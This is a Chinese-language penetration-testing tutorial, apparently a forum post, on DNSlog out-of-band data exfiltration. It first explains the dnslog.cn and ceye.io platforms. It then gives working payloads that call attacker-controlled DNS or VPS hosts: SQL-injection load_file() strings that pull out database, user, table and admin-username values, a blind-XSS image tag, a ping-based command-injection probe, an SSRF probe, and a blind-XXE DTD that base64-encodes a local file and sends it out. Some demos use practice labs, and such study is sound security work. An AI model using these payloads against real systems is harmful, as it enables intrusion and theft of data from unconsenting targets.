DNSlog
======

0.说在前面
------

### 0.1.DNSlog工具

如果有自己的服务器和域名，可以自建一个这样的平台，直接使用BugScan团队开源的工具搭建即可：

<https://github.com/BugScanTeam/DNSLog>

另外我们也可以使用在线平台：

<http://ceye.io>

<http://www.dnslog.cn>

#### 0.1.1.`http://www.dnslog.cn`使用方法

（1）Get SubDomain的意思是获取子域名，这里点击完就给我们一个三级域名。复制完后，打开新网页并粘贴在url上，访问![![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-c0687ad10537da349ad924b175a6afca5c5e4476.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-c0687ad10537da349ad924b175a6afca5c5e4476.png)

（2）点击完会出现一条DNS记录[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-f14317b7d8bea5db163db266909edf21d52b2edc.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-f14317b7d8bea5db163db266909edf21d52b2edc.png)

##### 0.1.1.1.注意

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-065f963423589826337162f340e45e14fdfb791e.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-065f963423589826337162f340e45e14fdfb791e.png)

这里一直刷新访问网址，并在DNSlog.cn里刷新记录（Refresh Record），可是无论怎么刷新，记录都是只有这几条。因为dns协议的目的是我要访问这个域名，可是不知道对应的ip，我就去问，第一次不知道，第二次不知道，第三次也不知道，那第四次总该记住了，这就是dns缓存了的问题。碰到一个新来的域名我不知道，但是问了几次之后我就知道了，我就不需要再查询了。这就是为什么怎么刷新都不会有新的记录了。

###### 解决方法

像下图这样在前面加一个1.，使它变成新的域名，再重新访问后，再刷新记录，就有了

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-5ffb94c1f3f4d6de4daf76e184e7fd757722fd86.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-5ffb94c1f3f4d6de4daf76e184e7fd757722fd86.png)

#### 0.1.2.`http://ceye.io`使用方法

和`http://www.dnslog.cn`使用方法类似

（1）login进入后，会给我们一个三级域名，在用户详情页"Profile"中自己的域名标识符"Identifier"。对于每个用户，都有唯一的域名标识符如 xxx.ceye.io 。所有来自于 xxx.ceye.io 或 \*.xxx.ceye.io 的DNS查询和HTTP请求都会被记录。

（2）我们复制完，打开新网页并粘贴在url上，访问

（3）最后可以在"Records"里的"DNS Query"中查看

1.什么是DNSlog
-----------

我们都知道DNS就是将域名解析为ip，用户在浏览器上输入一个域名`A.com`，就要靠DNS服务器将A.com解析到它的真实ip127.0.0.1，这样就可以访问127.0.0.1服务器上的相应服务。  
那么DNSlog是什么。DNSlog就是存储在DNS服务器上的域名信息，它记录着用户对域名`www.baidu.com`等的访问信息，类似日志文件。

2.DNSlog回显原理
------------

前面说DNSlog就是日志，那怎么用DNSlog进行注入并回显信息呢。我们得再了解一个多级域名的概念。  
\[域名分级与域名解析过程(DNS)\]([https://blog.csdn.net/weixin\_50464560/article/d](https://blog.csdn.net/weixin_50464560/article/d) etails/117607146)  
因特网采用层次树状结构命名方法。域是名字空间中一个可被管理的划分（按机构组织划分），域可被划分为子域，子域可再被划分，即形成了顶级域名、二级域名、三级域名等。从右向左为顶级域名、二级域名、三级域名等，用点隔开。如：

`tieba.baidu.com`

它由三个标号组成， com即为顶级域名，baidu为二级域名，tieba即为三级域名。且域名不区分大小写。

再来看一个图：

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-c3b1794630d95695aa27348ec67b2f3af6732f38.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-c3b1794630d95695aa27348ec67b2f3af6732f38.png)

通俗的说就是我有个已注册的域名`a.com`，我在域名代理商那里将域名设置对应的ip 1.1.1.1 上，这样当我向dns服务器发起a.com的解析请求时，DNSlog中会记录下他给a.com解析，解析值为1.1.1.1，而我们这个解析的记录的值就是我们要利用的地方。

看个直观一点的例子来理解：  
ping命令的时候会用到DNS解析所以我就用ping命令做个实验。

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-ea75766232ce07418584d72d0ec533a535299593.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-ea75766232ce07418584d72d0ec533a535299593.png)

DNSlog.cn中也记录了下来

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-e08b935de2260b29dc3c8c44d9b99d93a7d75715.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-e08b935de2260b29dc3c8c44d9b99d93a7d75715.png)

可以看到解析的日志会把%USERNAME%的值给带出来，因为系统在ping命令之前会将%USERNAME%的值解析出来，然后再和a.com拼接起来，最后ping命令执行将XF.a.com一起发给DNS服务器请求解析域名对应的ip地址，这个过程被记录下来就是DNSlog，看到这里应该有点感觉了。原理上只要能进行DNS请求的函数都可能存在DNSlog注入。

3.DNSlog通常用在哪些地方
----------------

大家在渗透测试的时候可能会遇到一下这些情况：

- 挖到一个有SQL盲注的站点，可是用sqlmap跑需要频繁请求，最后导致ip被ban
- 发现疑似命令注入的洞，但是目标站点什么也不显示，无法确认是不是有洞

总之就是目标不让信息显示出来，如果能发送请求，那么就可以尝试咱这个办法——用DNSlog来获取回显

（1）SQL注入中的盲注

（2）XSS盲打

（3）无回显的命令执行

（4）无回显的SSRF

（5）无回显的XXE（Blind XXE）

### 3.1.SQL注入盲注

在sql注入时为布尔盲注、时间盲注，注入的效率低且线程高容易被waf拦截，又或者是目标站点没有回显

#### 3.1.1.UNC路径

[UNC路径](https://baike.baidu.com/item/UNC%E8%B7%AF%E5%BE%84/3231808)

注意：读取远程文件就要用到UNC路径

UNC路径就是类似\\\\softer这样的形式的网络路径,就是\\\\。

例子：`\\\www.mss.cn\2.txt`

注意：这种用反斜杠是微软喜欢反着来，在微软文件夹里查询需要反斜杠；如果是在别的地方如url里查询就要用正斜杠&lt;code&gt;/&lt;/code&gt;，即//www.mss.cn/2.txt，如果硬要用反斜杠，得另外加两个反斜杠来转义，即要四个反斜杠，很麻烦。如：(select load\_file(concat('\\\\\\\\',(select datab ase()),'.xxxx.ceye.io\\\\abc')))

#### 3.1.2.mysql的load\_file()函数条件和secure\_file\_priv设置

例子：

select load\_file('/etc/hosts')

例如上面的例子是有条件限制的：

1、必须有权限读取并且文件必须完全可读。

```mysql
and (select count(*) from mysql.user)>0 /*如果结果返回正常，说明具有读写权限.*/
and (select count(*) from mysql.user)>0 /*返回错误，应该是管理员给数据库账户降权了*/
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-bbb6f22b697ee78cd5aff7bde2ebaa9317d5f676.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-bbb6f22b697ee78cd5aff7bde2ebaa9317d5f676.png)

我们查看mysql这个库中user表中的字段有这些[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-efc5843f31cfa6e3672ebe56f920788bd6e829c4.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-efc5843f31cfa6e3672ebe56f920788bd6e829c4.png)

通过DNSlog盲注需要用的load\_file()函数，所以一般得是root权限。`show variables like '%secure%'`;查看load\_file()可以读取的磁盘。  
（1）当secure\_file\_priv为空，就可以读取磁盘的目录。  
（2）当secure\_file\_priv为G:\\，就可以读取G盘的文件。  
（3）当secure\_file\_priv为null，load\_file就不能加载文件。（注意NULL不是我们要的空，NULL和空的类型不一样）

secure\_file\_priv设置通过设置my.ini来配置，不能通过SQL语言来修改，因为它是只读变量，secure\_file\_priv设置具体看这里：

若secure\_auth为ON，则用以下方法变为OFF（mysql查询默认是不区分大小写的）  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-7c1ba8c04f574056ffa293fe2f0ef96e90d15ec4.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-7c1ba8c04f574056ffa293fe2f0ef96e90d15ec4.png)  
secure\_file\_priv不能通过此方法修改，因为报错为Variable 'XXX' is a read only variable。报错原因及修改方法为：参数为只读参数，需要在mysql.ini配置文件中更改该参数，之后重启数据库  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-6e95ccb62cddc047fef526b1c6db49293ab043bf.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-6e95ccb62cddc047fef526b1c6db49293ab043bf.png)  
将secure\_file\_priv为空的正确方法（注意NULL不是我们要的空，NULL和空的类型不一样）  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-00f25371aa4f7080900a79376d1d8b3e6890515c.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-00f25371aa4f7080900a79376d1d8b3e6890515c.png)  
secure\_file\_priv=""就是可以load\_flie任意磁盘的文件。

2、欲读取文件必须在服务器上

3、必须指定文件完整的路径

4、欲读取文件必须小于`max_allowed_packet`

```mysql
show global VARIABLES like 'max_allowed_packet';

如果文件超过了max_allowed_packet，则结果如下：
mysql> select load_file("C:/Users/XF/Desktop/杀猪盘/index.php");
+---------------------------------------------------+
| load_file("C:/Users/XF/Desktop/杀猪盘/index.php")  |
+---------------------------------------------------+
| NULL                                              |
+---------------------------------------------------+
```

 如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的就是权限。

在windows下，如果NTFS设置得当，是不能读取相关的文件的，当遇到administrators才能访问的文件，users就不能实现用load\_file读取文件了。

##### 3.1.2.1.注意事项

1. dnslog注入只能用于windows，因为load\_file这个函数的主要目的还是读取本地的文件，所以我们在拼接的时候需要在前面加上两个//，这两个斜杠的目的是为了使用load\_file可以查询的unc路径。但是Linux服务器没有unc路径，也就无法使用dnslog注入。
2. 在进行注入的时候，需要先判断该位置是否存在注入，然后再在后面拼接代码，因为对照payload进行输入的话，可能会出现dnslog网站接收不到的情况，这是我在进行复现的时候遇到的情况。
3. 在域名的后面，我们需要拼接一个文件名，这是因为load\_file函数只能请求文件，如果不加后面的文件名，同样无法得到显示。

#### 3.1.3.过程

(1)这里字符型注入和数字型注入都不会回显，是盲注，我们就用DNSlog注入

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-33eaef32532483569218d23c035bdbdb10bcf195.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-33eaef32532483569218d23c035bdbdb10bcf195.png)

这里读取远程文件就要用到UNC路径，UNC路径就是类似\\\\softer这样的形式的网络路径,就是\\\\。例子：`\\\www.mss.cn\2.txt`。微软里喜欢跟别人反着来，所以在微软文件夹里查询用反斜杠&lt;code&gt;\\&lt;/code&gt;；而这里如果要在url中得用正斜杠&lt;code&gt;/&lt;/code&gt;，不然查不出来，如果硬要用反斜杠，得另外加反斜杠来转义，unc路径就要四个反斜杠，很麻烦。如：(select load\_file(concat('\\\\\\\\',(select datab ase()),'.xxxx.ceye.io\\\\abc')))

```mysql
当前库名payload：and (select load_file(concat('//',(select datab ase()),'.6.eudspa.dnslog.cn/a')))

注意：后面这个a文件存不存在并不重要，随便写个文件就行，只要发生了DNS解析，我们就能看到我们所需要的东西，如这里的库名，但是这个文件必须要写，因为这是load_file函数所需要的条件。
```

注：当前库名[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-8ecf103b60929686bf12f3f8c67cc14a1728ba21.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-8ecf103b60929686bf12f3f8c67cc14a1728ba21.png)

```mysql
用户名payload：and (select load_file(concat('//',(select hex(user())),'.wlgbdd.dnslog.cn/a')))

注意：为什么要对查询的内容进行hex编码？
如果我们要查询的用户名中存在特殊字符：如!@#$%^&
最后在请求DNS服务器时变成：!@#$%^&*.upa46v.dnslog.cn
存在特殊字符的域名无法解析。因此在DNS日志中也找不到我们查询的数据。
所以在我们查询时，当不确定查询结果是否存在特殊字符时，最好先将其hex编码后在带入查询。
```

将hex(用户名)去hex解码，得出结果为root@localhost

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-04e32ddebc2069cfcc4f913d34b16d59ce66b529.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-04e32ddebc2069cfcc4f913d34b16d59ce66b529.png)

```mysql
第一个表名payload：and (select load_file(concat('//',(select table_name from information_schema.tables where table_schema=datab ase() limit 0,1),'.wlgbdd.dnslog.cn/a')))

通过修改 limit 0,1 可以获得不同数据表
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-eb1ee1d22940ecc56691786cb4de1803b9cd2047.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-eb1ee1d22940ecc56691786cb4de1803b9cd2047.png)

```mysql
第二个数据列名payload：and (select load_file(concat('//',(select column_name from information_schema.columns where table_name='admin' limit 1,1),'.wlgbdd.dnslog.cn/a')))

通过修改 limit 0,1 可以获得不同数据列
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-82ac2b69f2f7ae26bcc577f4af14d08f9c65e21f.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-82ac2b69f2f7ae26bcc577f4af14d08f9c65e21f.png)

```mysql
表‘admin’列‘username’第一个字段名payload：and (select load_file(concat('//',(select username from maoshe.admin limit 0,1),'.wlgbdd.dnslog.cn/a')))

通过修改 limit 0,1 可以获得不同数据
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-0a45dd9c12a327c9849d7bd6f1126c19ceb08428.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-0a45dd9c12a327c9849d7bd6f1126c19ceb08428.png)

##### 3.1.3.1.注意

在我们查询时，当不确定查询结果是否存在特殊字符时，最好先将其hex编码后在带入查询。

### 3.2.XSS盲打

推荐：XSS绕过可以看看该文章：\[XSS过滤绕过速查表\]([https://blog.csdn.net/weixin\_50464560/article/d](https://blog.csdn.net/weixin_50464560/article/d) etails/114491500)

#### 3.2.1.介绍

简单来说，在xss上的利用是在于我们将xss的攻击代码拼接到dnslog网址的高级域名上，就可以在用户访问的时候，将他的信息带回来

#### 3.2.2.过程

通过盲打，让触发者浏览器访问预设至的链接地址，如果盲打成功，会在平台上收到如下的链接访问记录：

payload:

```js
<img src=http://xss.xxx.ceye.io>
```

让src请求我们的dnslog平台。这里举个例子：

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-6140fc57850965fa671dc0a4f4788fe99d4efd08.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-6140fc57850965fa671dc0a4f4788fe99d4efd08.png)

然后回来看DNSlog平台：

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-ad497b993df4b02ad44176e17ce9f31873f5c37f.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-ad497b993df4b02ad44176e17ce9f31873f5c37f.png)

已经收到了请求，所以dns已经被解析

这边再举一例：

DNSlog平台先搞一个域名

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-4f8bcbe4b29aaa291823516d460cc7e77feab8ff.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-4f8bcbe4b29aaa291823516d460cc7e77feab8ff.png)

在留言板里如下留言

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-8a7a2f0d8e1eb8f9e5b9d1680a3879021116faef.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-8a7a2f0d8e1eb8f9e5b9d1680a3879021116faef.png)

登录后台查看

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-5037274dab1e993e4f96b5b29468784661ae6eb2.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-5037274dab1e993e4f96b5b29468784661ae6eb2.png)

成功，这就是一个存储型xss盲打

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-bcadfbbf458f31aa052421295b31aec7178c3eae.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-bcadfbbf458f31aa052421295b31aec7178c3eae.png)

### 3.3.无回显的命令执行

#### 3.3.1.介绍

我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功

#### 3.3.2.过程

发现疑似命令执行的洞，但是目标站点什么也不显示，无法确认是不是有洞

如果是win系统，简单的`ping %os%.xxxx.cete.io`即可

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-aff00f0c01e6926db982e62603afe4eb0c93f6d4.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-aff00f0c01e6926db982e62603afe4eb0c93f6d4.png)

DNSlog这边得到了os的信息，那么就说明这里存在命令注入

下面是windows的常用变量：

```php
//变量                     类型       描述
//%ALLUSERSPROFILE%        本地       返回“所有用户”配置文件的位置。
//%APPDATA%                本地       返回默认情况下应用程序存储数据的位置。
//%CD%                     本地       返回当前目录字符串。
//%CMDCMDLINE%             本地       返回用来启动当前的 Cmd.exe 的准确命令行。
//%CMDEXTVERSION%          系统       返回当前的“命令处理程序扩展”的版本号。
//%COMPUTERNAME%           系统       返回计算机的名称。
//%COMSPEC%                系统       返回命令行解释器可执行程序的准确路径。
//%DATE%                   系统       返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。
//%ERRORLEVEL%             系统       返回上一条命令的错误代码。通常用非零值表示错误。
//%HOMEDRIVE%              系统       返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
//%HOMEPATH%               系统       返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
//%HOMESHARE%              系统       返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
//%LOGONSERVER%            本地       返回验证当前登录会话的域控制器的名称。
//%NUMBER_OF_PROCESSORS%   系统       指定安装在计算机上的处理器的数目。
//%OS%                     系统       返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。
//%PATH%                   系统       指定可执行文件的搜索路径。
//%PATHEXT%                系统       返回操作系统认为可执行的文件扩展名的列表。
//%PROCESSOR_ARCHITECTURE% 系统       返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。
//%PROCESSOR_IDENTFIER%    系统       返回处理器说明。
//%PROCESSOR_LEVEL%        系统       返回计算机上安装的处理器的型号。
//%PROCESSOR_REVISION%     系统       返回处理器的版本号。
//%P ROMPT%                 本地       返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。
//%RANDOM%                 系统       返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。
//%SYSTEMDRIVE%            系统       返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。
//%SYSTEMROOT%             系统       返回 Windows server operating system 根目录的位置。
//%TEMP%和%TMP%            系统和用户  返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。
//%TIME%                   系统       返回当前时间。使用与time /t命令相同的格式。由Cmd.exe生成。有关time命令的详细信息，请参阅 Time。
//%USERDOMAIN%             本地       返回包含用户帐户的域的名称。
//%USERNAME%               本地       返回当前登录的用户的名称。
//%USERPROFILE%            本地       返回当前用户的配置文件的位置。
//%WINDIR%                 系统       返回操作系统目录的位置。
```

如果目标系统是linux的话，则可用shell语言

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-a8f5c2bbf043e9ebfaa7a27912a5f8f8a4ad8a21.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-a8f5c2bbf043e9ebfaa7a27912a5f8f8a4ad8a21.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-7d6e516b4fc4badba10734711a54a81feb13ae6b.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-7d6e516b4fc4badba10734711a54a81feb13ae6b.png)

或者

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-9929798772db20531a9cc3e990ab6dc4ed25b217.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-9929798772db20531a9cc3e990ab6dc4ed25b217.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-1dfccd4c9c09a4ca9d984de39e88b0bdd0231f82.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-1dfccd4c9c09a4ca9d984de39e88b0bdd0231f82.png)

### 3.4.无回显的SSRF

#### 3.4.1.介绍

这里先来介绍下这个漏洞：

SSRF (Server-Side Request Forgery，服务器端请求伪造) 是一种由攻击者构造请求，由服务端发起请求的安全漏洞，一般情况下，SSRF攻击的目标是外网无法访问的内网系统，也正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔绝的内部系统。也就是说可以利用一个网络请求的服务，当作跳板进行攻击。

攻击者利用了可访问Web服务器（A）的特定功能 构造恶意payload；攻击者在访问A时，利用A的特定功能构造特殊payload，由A发起对内部网络中系统B（内网隔离，外部不可访问）的请求，从而获取敏感信息。此时A被作为中间人（跳板）进行利用。

SSRF漏洞的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤和限制。 例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等，利用的就是服务端请求伪造，SSRF利用存在缺陷的WEB应用作为代理 攻击远程 和 本地的服务器。

介绍结束。

那么当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL，若存在回显利用方式比较多 。但是若遇到无回显的SSRF，这时就可以考虑用DNSlog来解决。

#### 3.4.2.过程

这里用的时CTFHub上面的一个SSRF靶场。[CTFHub](%5BCTFHub%5D(https%3A//www.ctfhub.com/#/skilltree))

一点击进去首页就是这样,看到这样的url便下意识想到ssrf

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-24d9ada405e96c8cbd74a6a8e188696c5b7f5a2a.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-24d9ada405e96c8cbd74a6a8e188696c5b7f5a2a.png)

这里因为是让我们从目标主机内网环境访问其本地的flag.php，那我们就构造：`/?url=http://127.0.0.1/flag.php`

然后就成功访问到了目标机本地的flag.php

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-07e082d72f88cb5336c9bc15d5b59f50eb84ed92.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-07e082d72f88cb5336c9bc15d5b59f50eb84ed92.png)

这种是有回显的，我们很容易就判断出来这里存在SSRF漏洞。那么如果这里是无回显的呢，那么该如何判断这里可能存在SSRF呢？那么在前期渗透的时候我们这里就可以用DNSlog来初步判断服务器有对外发送请求的行为，为下一步的SSRF渗透打下基础：

`/?url=http://hfsy89.ceye.io`

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-64129dfda9e34b84f2b1d27b033d0bdc5bb42c27.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-64129dfda9e34b84f2b1d27b033d0bdc5bb42c27.png)

然后看我们的dnslog平台是否有服务器的IP来判断,这里就有可能有SSRF漏洞。

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-8fad68af083ea88e823b46fff1b90de3fd7134c3.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-8fad68af083ea88e823b46fff1b90de3fd7134c3.png)  
但是要特别注意一点：  
这样不能证明它一定能请求到内网，比如一些业务场景如人脸识别、图床、或者需要去外部加载资源等等，本身限制了访问内网ip，但是dnslog是在外网的，本身就可以访问的到。所以这里还有待继续研究。

### 3.5.无回显的XXE（Blind XXE）

#### 3.5.1.介绍

XXE漏洞全称（XML External Entity Injection）即XML外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载（下面会介绍），导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起DOS攻击等危害。

那么来介绍介绍外部实体的加载：

实体是用于定义引用普通文本或特殊字符的快捷方式的变量。实体引用是对实体的引用。实体可在内部或外部进行声明。

1.内部实体声明

`<!ENTITY 实体名称 "实体的值">`

如：

```X
<!ENTITY writer "Johnson666">
<!ENTITY copyright "Copyright W3School.com.cn">
```

我们要引用上面两个实体,则:

```X
<author>&writer;&copyright;</author>                 //&writer;相当于 "Johnson666"
```

2.外部实体声明

`<!ENTITY 实体名称 SYSTEM "URI/URL">`

如:

```X
<!ENTITY writer SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
<!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
```

引用：

```X
<author>&writer;&copyright;</author>
```

这两种引用的方式都为：

`&实体名;`

以上为外部实体的加载。

xxe如果前端页面都会有一个回显的话，我们可以很方便的进行文件读取，那前端页面要是不进行回显了，那我们怎么判断是否存在xxe漏洞了呢？这里就涉及了blind xxe(无回显的xxe)，其实利用dnslog就能进行判断，若dnslog有记录说明存在此漏洞。这里最关键的是证明存在后，怎么用blind xxe进行文件读取，这就涉及到用VPS了，下面我会介绍。

#### 3.5.2.过程

这里我以pikachu靶场为例：

1.修改源码

我们将源码中的输出语句进行注释，构成Blind XXE

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-d81e2d4e0dd5094abc8e176fe8f0542a0c23c89c.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-d81e2d4e0dd5094abc8e176fe8f0542a0c23c89c.png)

这样再进行判断是否能输出解析的X ML语句，如下页面中就看到不了hi了

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-1320a0f1c583f1aca69da08492f63fb682ae0856.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-1320a0f1c583f1aca69da08492f63fb682ae0856.png)

原本没修改源码前是可以看到的

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-f74f987a7c1dfa9b41e2e4371bc1170e8f626b8d.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-f74f987a7c1dfa9b41e2e4371bc1170e8f626b8d.png)

2.漏洞验证

在输入框中提交dnslog测试的语句

```X
<?X ML version="1.0" encoding="gb2312"?>

]>
<reset><login>&xi;</login><secret>Any bugs?</secret></reset>
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-23d9f27c4f862cad825269e32778b795854ac8e4.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-23d9f27c4f862cad825269e32778b795854ac8e4.png)

然后去dnslog平台上查看，看到接收到了信息，说明漏洞真的存在

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-750ec8e968e30b98023dd1b81249338ef7cc0a3f.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-750ec8e968e30b98023dd1b81249338ef7cc0a3f.png)

3.文件读取

这里需要一个VPS，VPS中放入一个DTD的文件，并在该文件所在目录开启一个web服务，我这里用的是python开启的

a.dtd文件内如下:

```X
<!ENTITY % file SYSTEM "php://filter/read=convert.b ase64-encode/resource=file:///c:/windows/blind.txt">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://vps的ip:6666/%file;'>">
```

这段代码的意思是：实体int为`http://vps的ip:6666/`，实体file为`file:///c:/windows/blind.txt`（经过b ase64编码），总体的意思就是访问vps的6666端口并携带本机的c:/windows/blind.txt的文件。

python开启web服务，监听11111端口

`python -m http.server 11111`

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-e87a89b8e3385b5b7c511715a70bf07d866fe0ce.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-e87a89b8e3385b5b7c511715a70bf07d866fe0ce.png)

这样就可以通过本机去访问这个web服务

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-6d6e80c3d2d21d974acb1644b5219c5012f327ae.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-6d6e80c3d2d21d974acb1644b5219c5012f327ae.png)

然后再用python再开启一个端口，接收读取的目标服务器的数据，这里监听的是上面文件中写的6666端口

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-460fdb3c6f6cdca3dd9436473a089266523223be.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-460fdb3c6f6cdca3dd9436473a089266523223be.png)

payload:

```X
<?X ML version="1.0" encoding="gb2312"?>

%xxe;%int;%send; ]>
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-70700da9627b729c781def6a4850a8bd4ecea35b.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-70700da9627b729c781def6a4850a8bd4ecea35b.png)

burp suite提交数据后，可能会无响应，这时只要刷新一下浏览器所在的web服务界面就行

查看接收的数据

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-33d4ae66f49143d5cc13758dddf762750d8d62a1.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-33d4ae66f49143d5cc13758dddf762750d8d62a1.png)

我们将这个数据进行b ase64解码后查看，就是我们主机上的文件

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-5ee66428c02dc7c692ffd9d1b7b146e22f269241.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-5ee66428c02dc7c692ffd9d1b7b146e22f269241.png)

通过这样的方式，我们可以一直进行文件读取，直到读取到有用的数据，比如说公钥文件，就可能能进行远程连接ssh。